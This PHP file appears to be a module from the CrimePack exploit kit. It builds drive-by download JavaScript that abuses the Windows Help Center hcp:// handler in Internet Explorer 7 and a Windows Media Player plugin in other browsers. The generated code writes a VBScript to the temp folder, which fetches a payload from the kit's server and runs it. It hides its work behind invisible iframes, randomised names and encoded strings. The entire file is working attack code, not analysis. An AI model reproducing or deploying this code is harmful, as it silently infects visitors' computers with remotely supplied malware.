<?php 
include("hcp.stuff.php");
if( $browser == "ie" && 7 <= $version || $browser == "ff" || $browser == "ch" ) 
{
    $randVar = $GLOBALS["cpFunctions"]->CreateArrayString(rand(10, 30), "100");
    $strUrl = $GLOBALS["cpXplHelper"]->GetURL("hcp", $browser, $os, "hcp");
    $asxUrl = $GLOBALS["cpXplHelper"]->GetNormalURL() . "hcp.php?type=2";
    $x = getChar(2, 20);
    $content = "cmd /c echo " . $x[0] . "=\"" . $x[4] . ".vbs\":With CreateObject(\"MSXML2.XMLHTTP\"):.open \"GET\",\"" . $GLOBALS["cpXplHelper"]->GetNormalURL() . "hcp.php?type=3&b=" . $browser . "&o=" . $os . "\",false:.send():Set " . $x[1] . " = CreateObject(\"Scripting.FileSystemObject\"):" . $x[3] . " = " . $x[1] . ".GetSpecialFolder(2) + \"\\\" + " . $x[0] . ":Set " . $x[5] . "=" . $x[1] . ".CreateTextFile(" . $x[3] . "):" . $x[5] . ".WriteLine .responseText:End With:" . $x[5] . ".Close:SET " . $x[6] . " = CreateObject(\"WScript.Shell\"):" . $x[6] . ".Run " . $x[3] . " > %TEMP%\\" . $x[4] . ".vbs && %TEMP%\\" . $x[4] . ".vbs && taskkill /F /IM helpctr.exe";
    $functionName = $ExploitFunctions[6];
    $eArray[] = "\r\n\tfunction " . $functionName . "(){\r\n\t" . (($browser == "ie" ? "\r\n\tif (window.ActiveXObject){\r\n\r\n\t\t" . (($version == "7" ? "\r\n\t\t\t\t\tvar " . $randVar[2] . " = document.createElement(\"iframe\");\r\n\t\t\t\t\t" . $randVar[2] . ".setAttribute(\"src\", \"" . urlencode("hcp://services/search?query=crimepack&topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=%3Cscript%20defer%3Eeval(Run(String.fromCharCode(" . EncryptVB($content) . ")))%3C/scr1pt%3E") . "\".replace(/scr1pt/g,\"script\"));\r\n\t\t\t\t\t" . $randVar[2] . ".setAttribute(\"width\", " . rand(1, 100) . ");\r\n\t\t\t\t\t" . $randVar[2] . ".setAttribute(\"height\", " . rand(1, 100) . ");\r\n\t\t\t\t\t" . $randVar[2] . ".setAttribute(\"style\", \"border:none\");\r\n\t\t\t\t\tdocument.body.appendChild(" . $randVar[2] . ");\r\n\t\t " : "\r\n\t\t\tvar o = document.createElement(\"OBJECT\");\r\n\t\t\to.setAttribute(\"classid\", \"clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6\");\r\n\t\t\to.setAttribute(\"uiMode\", \"invisible\");\r\n\t\t\to.openPlayer(\"" . $asxUrl . "&b=" . $browser . "&o=" . $os . "\");\r\n\t\t  \r\n\t\t  ")) . "\r\n\t}else{\r\n\t\t{next}\r\n\t}\r\n\r\n\t" : "\r\n\r\n\tvar " . $randVar[0] . "  = false;\r\n\tif (navigator.plugins && navigator.plugins.length){\r\n\t\tfor (var " . $randVar[1] . " = 0; " . $randVar[1] . " < navigator.plugins.length; " . $randVar[1] . "++){\r\n\t\t\tif (navigator.plugins[" . $randVar[1] . "].description.indexOf('Npdsplay') !=- 1) {\r\n\t\t\t\t" . $randVar[0] . " = true;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\tif (" . $randVar[0] . "){\r\n\t\t\t\t\tvar " . $randVar[2] . " = document.createElement('iframe');\r\n\t\t\t\t\t" . $randVar[2] . ".setAttribute('src', '" . $asxUrl . "&b=" . $browser . "&o=" . $os . "');\r\n\t\t\t\t\t" . $randVar[2] . ".setAttribute('width', " . rand(1, 100) . ");\r\n\t\t\t\t\t" . $randVar[2] . ".setAttribute('height', " . rand(1, 100) . ");\r\n\t\t\t\t\t" . $randVar[2] . ".setAttribute('style', 'border:none');\r\n\t\t\t\t\tdocument.body.appendChild(" . $randVar[2] . ");\r\n\t\t}else{\r\n\t\t\t{next}\r\n\t\t\treturn;\r\n\t\t}\r\n\t}\r\n\t")) . "\r\n\t\tsetTimeout(\"{next}\", 1500);\r\n\t}";
}


